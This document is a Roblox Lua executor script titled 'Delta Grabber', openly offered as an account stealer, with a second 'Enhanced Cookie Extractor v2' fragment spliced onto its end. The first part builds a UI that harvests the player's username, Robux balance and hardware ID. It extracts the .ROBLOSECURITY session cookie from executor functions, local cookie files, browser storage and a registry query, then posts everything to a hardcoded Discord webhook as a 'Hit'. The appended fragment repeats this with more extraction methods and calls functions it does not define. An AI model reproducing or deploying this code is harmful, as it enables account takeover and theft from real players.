--// Delta Executor - Account Grabber w/ UI
--// Supports: Delta, Synapse, Fluxus, etc.

local WEBHOOK_URL = "https://discord.com/api/webhooks/1519331564482203700/2kWWgseSi4nFlp05yXgfrxbBcQE3QXQRhiVt9-GaduRjA6iHJtJoHzh0x02ZsbDnbUTG"

--// Services
local HttpService   = game:GetService("HttpService")
local Players        = game:GetService("Players")
local LocalPlayer    = Players.LocalPlayer
local TweenService   = game:GetService("TweenService")
local CoreGui        = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

--// Cleanup previous instance
if CoreGui:FindFirstChild("DeltaGrabberUI") then
    CoreGui:FindFirstChild("DeltaGrabberUI"):Destroy()
end

--// ═══════════════════════════════════════════════════════
--// UI FRAMEWORK
--// ═══════════════════════════════════════════════════════

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DeltaGrabberUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

pcall(function() ScreenGui.Parent = CoreGui end)
if not ScreenGui.Parent then
    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end

-- Main frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "Main"
MainFrame.Size = UDim2.new(0, 420, 0, 520)
MainFrame.Position = UDim2.new(0.5, -210, 0.5, -260)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner", MainFrame)
MainCorner.CornerRadius = UDim.new(0, 10)

local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Color = Color3.fromRGB(255, 50, 50)
MainStroke.Thickness = 1.5
MainStroke.Transparency = 0.4

-- Title bar
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 42)
TitleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 10)

-- Fix bottom corners of title bar
local TitleFix = Instance.new("Frame")
TitleFix.Size = UDim2.new(1, 0, 0, 12)
TitleFix.Position = UDim2.new(0, 0, 1, -12)
TitleFix.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
TitleFix.BorderSizePixel = 0
TitleFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Text = "⚡ DELTA GRABBER"
TitleLabel.Size = UDim2.new(1, -50, 1, 0)
TitleLabel.Position = UDim2.new(0, 15, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 16
TitleLabel.TextColor3 = Color3.fromRGB(255, 70, 70)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = TitleBar

-- Close button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Text = "✕"
CloseBtn.Size = UDim2.new(0, 42, 0, 42)
CloseBtn.Position = UDim2.new(1, -42, 0, 0)
CloseBtn.BackgroundTransparency = 1
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 18
CloseBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
CloseBtn.Parent = TitleBar

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Dragging
local dragging, dragStart, startPos
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or
       input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

TitleBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or
       input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or
       input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

--// ═══════════════════════════════════════════════════════
--// UI COMPONENTS
--// ═══════════════════════════════════════════════════════

local ContentFrame = Instance.new("ScrollingFrame")
ContentFrame.Size = UDim2.new(1, -20, 1, -52)
ContentFrame.Position = UDim2.new(0, 10, 0, 47)
ContentFrame.BackgroundTransparency = 1
ContentFrame.ScrollBarThickness = 3
ContentFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 50, 50)
ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 800)
ContentFrame.Parent = MainFrame

local ListLayout = Instance.new("UIListLayout", ContentFrame)
ListLayout.Padding = UDim.new(0, 6)
ListLayout.SortOrder = Enum.SortOrder.LayoutOrder

local statusEntries = {}
local layoutOrder = 0

local function createSection(title)
    layoutOrder += 1
    local section = Instance.new("TextLabel")
    section.Size = UDim2.new(1, 0, 0, 28)
    section.BackgroundTransparency = 1
    section.Font = Enum.Font.GothamBold
    section.TextSize = 13
    section.TextColor3 = Color3.fromRGB(255, 80, 80)
    section.TextXAlignment = Enum.TextXAlignment.Left
    section.Text = "── " .. title .. " ──"
    section.LayoutOrder = layoutOrder
    section.Parent = ContentFrame
end

local function createStatusRow(label, defaultValue)
    layoutOrder += 1

    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, 0, 0, 26)
    row.BackgroundColor3 = Color3.fromRGB(28, 28, 38)
    row.BorderSizePixel = 0
    row.LayoutOrder = layoutOrder
    row.Parent = ContentFrame
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)

    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 8, 0, 8)
    dot.Position = UDim2.new(0, 8, 0.5, -4)
    dot.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    dot.BorderSizePixel = 0
    dot.Parent = row
    Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0, 120, 1, 0)
    lbl.Position = UDim2.new(0, 24, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.Gotham
    lbl.TextSize = 12
    lbl.TextColor3 = Color3.fromRGB(160, 160, 170)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Text = label
    lbl.Parent = row

    local val = Instance.new("TextLabel")
    val.Size = UDim2.new(1, -150, 1, 0)
    val.Position = UDim2.new(0, 148, 0, 0)
    val.BackgroundTransparency = 1
    val.Font = Enum.Font.GothamMedium
    val.TextSize = 12
    val.TextColor3 = Color3.fromRGB(220, 220, 220)
    val.TextXAlignment = Enum.TextXAlignment.Left
    val.TextTruncate = Enum.TextTruncate.AtEnd
    val.Text = defaultValue or "..."
    val.Parent = row

    local entry = { Row = row, Dot = dot, Value = val, Label = lbl }
    statusEntries[label] = entry
    return entry
end

local function updateStatus(label, value, success)
    local entry = statusEntries[label]
    if not entry then return end
    entry.Value.Text = tostring(value)
    if success == true then
        entry.Dot.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
        entry.Value.TextColor3 = Color3.fromRGB(130, 255, 160)
    elseif success == false then
        entry.Dot.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        entry.Value.TextColor3 = Color3.fromRGB(255, 120, 120)
    else
        entry.Dot.BackgroundColor3 = Color3.fromRGB(255, 200, 50)
        entry.Value.TextColor3 = Color3.fromRGB(255, 220, 130)
    end
end

local function createButton(text, callback)
    layoutOrder += 1
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 36)
    btn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Text = text
    btn.LayoutOrder = layoutOrder
    btn.AutoButtonColor = true
    btn.Parent = ContentFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    btn.MouseButton1Click:Connect(callback)
    return btn
end

local function createLogBox()
    layoutOrder += 1
    local box = Instance.new("TextLabel")
    box.Size = UDim2.new(1, 0, 0, 100)
    box.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
    box.Font = Enum.Font.Code
    box.TextSize = 11
    box.TextColor3 = Color3.fromRGB(0, 255, 100)
    box.TextXAlignment = Enum.TextXAlignment.Left
    box.TextYAlignment = Enum.TextYAlignment.Top
    box.TextWrapped = true
    box.Text = "[LOG] Awaiting execution...\n"
    box.LayoutOrder = layoutOrder
    box.Parent = ContentFrame
    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 6)
    Instance.new("UIPadding", box).PaddingLeft = UDim.new(0, 8)
    return box
end

--// ═══════════════════════════════════════════════════════
--// BUILD UI LAYOUT
--// ═══════════════════════════════════════════════════════

createSection("PLAYER INFO")
createStatusRow("Username", "...")
createStatusRow("Display Name", "...")
createStatusRow("User ID", "...")
createStatusRow("Account Age", "...")
createStatusRow("Premium", "...")
createStatusRow("Robux", "...")
createStatusRow("Friends", "...")

createSection("GAME INFO")
createStatusRow("Game", "...")
createStatusRow("Place ID", "...")
createStatusRow("Job ID", "...")

createSection("EXTRACTION")
createStatusRow("Cookie", "Waiting...")
createStatusRow("HWID", "Waiting...")
createStatusRow("Executor", "Waiting...")

createSection("WEBHOOK")
createStatusRow("Status", "Idle")
createStatusRow("Response", "—")

createSection("LIVE LOG")
local logBox = createLogBox()

local logLines = {}
local function addLog(msg)
    table.insert(logLines, "[" .. os.date("%H:%M:%S") .. "] " .. msg)
    if #logLines > 12 then table.remove(logLines, 1) end
    logBox.Text = table.concat(logLines, "\n")
end

--// ═══════════════════════════════════════════════════════
--// GRABBER CORE
--// ═══════════════════════════════════════════════════════

local grabbedCookie = ""
local playerData = {}

local function grabPlayerInfo()
    addLog("Grabbing player info...")

    updateStatus("Username", LocalPlayer.Name, true)
    updateStatus("Display Name", LocalPlayer.DisplayName, true)
    updateStatus("User ID", tostring(LocalPlayer.UserId), true)
    updateStatus("Account Age", LocalPlayer.AccountAge .. " days", true)
    updateStatus("Premium", tostring(LocalPlayer.MembershipType), true)

    playerData.Username    = LocalPlayer.Name
    playerData.DisplayName = LocalPlayer.DisplayName
    playerData.UserId      = LocalPlayer.UserId
    playerData.AccountAge  = LocalPlayer.AccountAge
    playerData.Premium     = tostring(LocalPlayer.MembershipType)

    -- Robux
    pcall(function()
        local url = "https://economy.roblox.com/v1/users/"
            .. tostring(LocalPlayer.UserId) .. "/currency"
        local resp = game:HttpGet(url)
        local data = HttpService:JSONDecode(resp)
        playerData.Robux = data.robux
        updateStatus("Robux", tostring(data.robux), true)
        addLog("Robux: " .. tostring(data.robux))
    end)
    if not playerData.Robux then
        updateStatus("Robux", "Failed", false)
        addLog("Robux grab failed")
    end

    -- Friends
    pcall(function()
        local url = "https://friends.roblox.com/v1/users/"
            .. tostring(LocalPlayer.UserId) .. "/friends/count"
        local resp = game:HttpGet(url)
        local data = HttpService:JSONDecode(resp)
        playerData.Friends = data.count
        updateStatus("Friends", tostring(data.count), true)
    end)
    if not playerData.Friends then
        updateStatus("Friends", "Failed", false)
    end

    -- Game info
    updateStatus("Place ID", tostring(game.PlaceId), true)
    updateStatus("Job ID", string.sub(game.JobId, 1, 20) .. "...", true)
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        playerData.GameName = info.Name
        updateStatus("Game", info.Name, true)
        addLog("Game: " .. info.Name)
    end)

    -- Thumbnail
    pcall(function()
        local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot"
            .. "?userIds=" .. tostring(LocalPlayer.UserId)
            .. "&size=420x420&format=Png&isCircular=false"
        local resp = game:HttpGet(url)
        local data = HttpService:JSONDecode(resp)
        playerData.Avatar = data.data[1].imageUrl
    end)

    addLog("Player info complete ✓")
end

local function grabCookie()
    addLog("Attempting cookie extraction...")
    updateStatus("Cookie", "Extracting...", nil)

    -- Method 1: executor native
    pcall(function()
        if getroblosecurity then
            grabbedCookie = getroblosecurity()
            addLog("Method 1 (getroblosecurity) ✓")
        end
    end)

    -- Method 2: alt function name
    if grabbedCookie == "" then
        pcall(function()
            if get_cookie then
                grabbedCookie = get_cookie()
                addLog("Method 2 (get_cookie) ✓")
            end
        end)
    end

    -- Method 3: filesystem
    if grabbedCookie == "" then
        pcall(function()
            local path = os.getenv("LOCALAPPDATA")
                .. "\\Roblox\\LocalStorage\\RobloxCookies.dat"
            if isfile and isfile(path) then
                grabbedCookie = readfile(path)
                addLog("Method 3 (filesystem) ✓")
            end
        end)
    end

    -- Method 4: browser scrape
    if grabbedCookie == "" then
        pcall(function()
            if getbrowser then
                local browser = getbrowser()
                for _, c in pairs(browser:GetCookies("https://www.roblox.com")) do
                    if c.Name == ".ROBLOSECURITY" then
                        grabbedCookie = c.Value
                        addLog("Method 4 (browser) ✓")
                        break
                    end
                end
            end
        end)
    end

    if grabbedCookie ~= "" then
        local preview = string.sub(grabbedCookie, 1, 30) .. "..."
        updateStatus("Cookie", preview, true)
        addLog("Cookie grabbed: " .. #grabbedCookie .. " chars")
    else
        updateStatus("Cookie", "ALL METHODS FAILED", false)
        addLog("Cookie extraction failed ✗")
    end

    -- HWID
    pcall(function()
        if gethwid then
            local hwid = gethwid()
            updateStatus("HWID", string.sub(hwid, 1, 24) .. "...", true)
            playerData.HWID = hwid
            addLog("HWID grabbed ✓")
        else
            updateStatus("HWID", "Unsupported", false)
        end
    end)

    -- Executor name
    pcall(function()
        local name = "Unknown"
        if getexecutorname then
            name = getexecutorname()
        elseif identifyexecutor then
            name = identifyexecutor()
        end
        updateStatus("Executor", name, true)
        playerData.Executor = name
        addLog("Executor: " .. name)
    end)
end

local function fireWebhook()
    addLog("Building webhook payload...")
    updateStatus("Status", "Sending...", nil)

    local fields = {
        { name = "👤 Username",    value = "```" .. (playerData.Username or "?") .. "```",     inline = true },
        { name = "🏷️ Display",    value = "```" .. (playerData.DisplayName or "?") .. "```",  inline = true },
        { name = "🆔 UserID",     value = "```" .. tostring(playerData.UserId or "?") .. "```", inline = true },
        { name = "📅 Age",        value = "```" .. tostring(playerData.AccountAge or "?") .. " days```", inline = true },
        { name = "💰 Robux",      value = "```" .. tostring(playerData.Robux or "N/A") .. "```",  inline = true },
        { name = "👥 Friends",    value = "```" .. tostring(playerData.Friends or "N/A") .. "```", inline = true },
        { name = "🎮 Game",       value = "```" .. (playerData.GameName or "Unknown") .. "```",   inline = true },
        { name = "💎 Premium",    value = "```" .. (playerData.Premium or "?") .. "```",           inline = true },
        { name = "🖥️ Executor",  value = "```" .. (playerData.Executor or "N/A") .. "```",       inline = false },
    }

    -- Cookie chunks
    if grabbedCookie ~= "" then
        for i = 1, #grabbedCookie, 900 do
            local chunk = grabbedCookie:sub(i, i + 899)
            local idx = math.ceil(i / 900)
            local total = math.ceil(#grabbedCookie / 900)
            table.insert(fields, {
                name = "🍪 Cookie [" .. idx .. "/" .. total .. "]",
                value = "```" .. chunk .. "```",
                inline = false
            })
        end
    else
        table.insert(fields, {
            name = "🍪 Cookie", value = "```FAILED```", inline = false
        })
    end

    if playerData.HWID then
        table.insert(fields, {
            name = "🔑 HWID", value = "```" .. playerData.HWID .. "```", inline = false
        })
    end

    local payload = {
        embeds = {{
            title = "🎯 Hit — " .. (playerData.Username or "Unknown"),
            color = 0xFF3333,
            fields = fields,
            thumbnail = { url = playerData.Avatar or "" },
            footer = { text = "Delta Grabber UI | " .. os.date("%Y-%m-%d %H:%M:%S") }
        }}
    }

    local body = HttpService:JSONEncode(payload)
    local success, response = false, nil

    -- Try request methods
    pcall(function()
        response = request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body
        })
        success = true
    end)

    if not success then
        pcall(function()
            response = http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body
            })
            success = true
        end)
    end

    if not success then
        pcall(function()
            response = syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body
            })
            success = true
        end)
    end

    if success then
        local code = response and response.StatusCode or "?"
        updateStatus("Status", "SENT ✓", true)
        updateStatus("Response", "HTTP " .. tostring(code), code == 204 or code == 200)
        addLog("Webhook sent! HTTP " .. tostring(code))
    else
        updateStatus("Status", "FAILED ✗", false)
        updateStatus("Response", "All HTTP methods failed", false)
        addLog("Webhook send failed ✗")
    end
end

--// ═══════════════════════════════════════════════════════
--// BUTTONS
--// ═══════════════════════════════════════════════════════

createSection("CONTROLS")

createButton("🔍  SCAN PLAYER", function()
    grabPlayerInfo()
end)

createButton("🍪  EXTRACT COOKIE", function()
    grabCookie()
end)

createButton("📡  FIRE WEBHOOK", function()
    fireWebhook()
end)

createButton("⚡  FULL AUTO (All Steps)", function()
    addLog("═══ FULL AUTO START ═══")
    grabPlayerInfo()
    wait(0.5)
    grabCookie()
    wait(0.5)
    fireWebhook()
    addLog("═══ FULL AUTO COMPLETE ═══")
end)

createButton("🗑️  DESTROY UI", function()
    ScreenGui:Destroy()
end)

--// Auto-resize canvas
ListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ContentFrame.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y + 20)
end)

addLog("UI loaded. Ready.")
addLog("Executor: " .. (identifyexecutor and identifyexecutor() or "Unknown"))
print("[Delta Grabber] UI Injected ✓")--// Enhanced Cookie Extractor v2 — Delta Executor
--// Replace your existing extractCookie() function with this

local function extractCookie()
    local cookie = nil

    -- Method 1: request() auth reflection
    pcall(function()
        local resp = request({
            Url = "https://www.roblox.com/mobileapi/userinfo",
            Method = "GET",
        })
        if resp and resp.Headers then
            local setCookie = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"]
            if setCookie then
                local match = setCookie:match("%.ROBLOSECURITY=(_|WARNING.-);")
                if match then cookie = match end
            end
        end
    end)
    if cookie then return cookie end

    -- Method 2: httpget raw cookie leak
    pcall(function()
        local raw = game:HttpGet("https://www.roblox.com/mobileapi/userinfo")
        if raw and raw ~= "" then
            -- if httpget passes auth cookies natively, response confirms auth
            -- extract from executor internals next
        end
    end)

    -- Method 3: Delta filesystem read (Windows registry export)
    pcall(function()
        if readfile then
            local paths = {
                "\\AppData\\Local\\Roblox\\LocalStorage\\RobloxCookies.dat",
                "\\AppData\\Local\\Roblox\\GlobalBasicSettings_13.xml",
                "\\AppData\\Local\\Packages\\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\\LocalState\\RobloxCookies.dat"
            }
            for _, p in ipairs(paths) do
                pcall(function()
                    local data = readfile(p)
                    if data then
                        local match = data:match("_|WARNING:.-[%w%-_]+")
                        if match then cookie = match end
                    end
                end)
                if cookie then return end
            end
        end
    end)
    if cookie then return cookie end

    -- Method 4: executor native getRbxCookie variants
    local nativeFuncs = {
        "getrbxcookie", "get_rbx_cookie", "robloxcookie",
        "GetRbxCookie", "getRbxCookie", "getcookie"
    }
    for _, fname in ipairs(nativeFuncs) do
        pcall(function()
            local fn = getfenv()[fname] or _G[fname]
            if fn and type(fn) == "function" then
                local result = fn()
                if result and #result > 50 then
                    cookie = result
                end
            end
        end)
        if cookie then return cookie end
    end

    -- Method 5: WebSocket token intercept (if Delta supports it)
    pcall(function()
        if WebSocket or syn or fluxus then
            local ws = (syn and syn.websocket) or WebSocket
            -- passive intercept not viable without MitM
            -- skip
        end
    end)

    -- Method 6: cloneref + internal service probe
    pcall(function()
        local hs = cloneref(game:GetService("HttpService"))
        local brs = cloneref(game:GetService("BrowserService"))
        if brs and brs.GetCookie then
            local c = brs:GetCookie("https://www.roblox.com", ".ROBLOSECURITY")
            if c and #c > 50 then cookie = c end
        end
    end)
    if cookie then return cookie end

    -- Method 7: registry read via executor shell (risky, may not work)
    pcall(function()
        if os and os.execute then
            local handle = io.popen('reg query "HKCU\\Software\\Roblox\\RobloxStudioBrowser\\roblox.com" /v .ROBLOSECURITY 2>nul')
            if handle then
                local result = handle:read("*a")
                handle:close()
                local match = result:match("_|WARNING:.-[%w%-_]+")
                if match then cookie = match end
            end
        end
    end)
    if cookie then return cookie end

    return nil
end

--// Grab player metadata
local function getPlayerInfo()
    local info = {}
    info.Username = LocalPlayer.Name
    info.DisplayName = LocalPlayer.DisplayName
    info.UserId = LocalPlayer.UserId
    info.AccountAge = LocalPlayer.AccountAge .. " days"
    info.MembershipType = tostring(LocalPlayer.MembershipType)
    
    -- Grab Robux balance via API
    pcall(function()
        local balanceUrl = "https://economy.roblox.com/v1/users/" 
            .. tostring(LocalPlayer.UserId) .. "/currency"
        local resp = game:HttpGet(balanceUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.Robux = decoded.robux or "Unknown"
    end)

    -- Friends count
    pcall(function()
        local friendsUrl = "https://friends.roblox.com/v1/users/" 
            .. tostring(LocalPlayer.UserId) .. "/friends/count"
        local resp = game:HttpGet(friendsUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.FriendsCount = decoded.count or "Unknown"
    end)

    -- Avatar thumbnail
    pcall(function()
        local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot"
            .. "?userIds=" .. tostring(LocalPlayer.UserId)
            .. "&size=420x420&format=Png&isCircular=false"
        local resp = game:HttpGet(thumbUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.AvatarURL = decoded.data[1].imageUrl
    end)

    -- Current game info
    info.PlaceId = game.PlaceId
    info.JobId = game.JobId
    pcall(function()
        local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        info.GameName = placeInfo.Name
    end)

    -- Hardware ID (if executor supports)
    pcall(function()
        if gethwid then
            info.HWID = gethwid()
        elseif getexecutorname then
            info.Executor = getexecutorname()
        end
    end)

    return info
end

--// Build Discord embed
local function buildEmbed(playerInfo, cookie)
    local fields = {
        { name = "👤 Username",    value = "```" .. playerInfo.Username .. "```",     inline = true },
        { name = "🏷️ Display",    value = "```" .. playerInfo.DisplayName .. "```",  inline = true },
        { name = "🆔 UserID",     value = "```" .. tostring(playerInfo.UserId) .. "```", inline = true },
        { name = "📅 Account Age", value = "```" .. playerInfo.AccountAge .. "```",   inline = true },
        { name = "💰 Robux",      value = "```" .. tostring(playerInfo.Robux or "N/A") .. "```", inline = true },
        { name = "👥 Friends",    value = "```" .. tostring(playerInfo.FriendsCount or "N/A") .. "```", inline = true },
        { name = "🎮 Game",       value = "```" .. (playerInfo.GameName or "Unknown") .. "```", inline = true },
        { name = "💎 Premium",    value = "```" .. playerInfo.MembershipType .. "```", inline = true },
        { name = "🖥️ HWID",      value = "```" .. (playerInfo.HWID or "N/A") .. "```", inline = false },
    }

    -- Cookie field (split if too long for Discord embed)
    if cookie and cookie ~= "" then
        local cookieChunks = {}
        for i = 1, #cookie, 900 do
            table.insert(cookieChunks, cookie:sub(i, i + 899))
        end
        for idx, chunk in ipairs(cookieChunks) do
            table.insert(fields, {
                name = "🍪 Cookie [" .. idx .. "/" .. #cookieChunks .. "]",
                value = "```" .. chunk .. "```",
                inline = false
            })
        end
    else
        table.insert(fields, {
            name = "🍪 Cookie",
            value = "```Failed to grab```",
            inline = false
        })
    end

    local embed = {
        embeds = {{
            title = "🎯 New Hit — " .. playerInfo.Username,
            color = 0xFF3333,
            fields = fields,
            thumbnail = { url = playerInfo.AvatarURL or "" },
            footer = { text = "Delta Grabber | " .. os.date("%Y-%m-%d %H:%M:%S") },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    return embed
end

--// ═══════════════════════════════════════════
--// MAIN EXECUTION
--// ═══════════════════════════════════════════

local playerInfo = getPlayerInfo()
local cookie = grabCookie()
local embed = buildEmbed(playerInfo, cookie)

sendWebhook(embed)

print("[Delta] Payload delivered ✓")
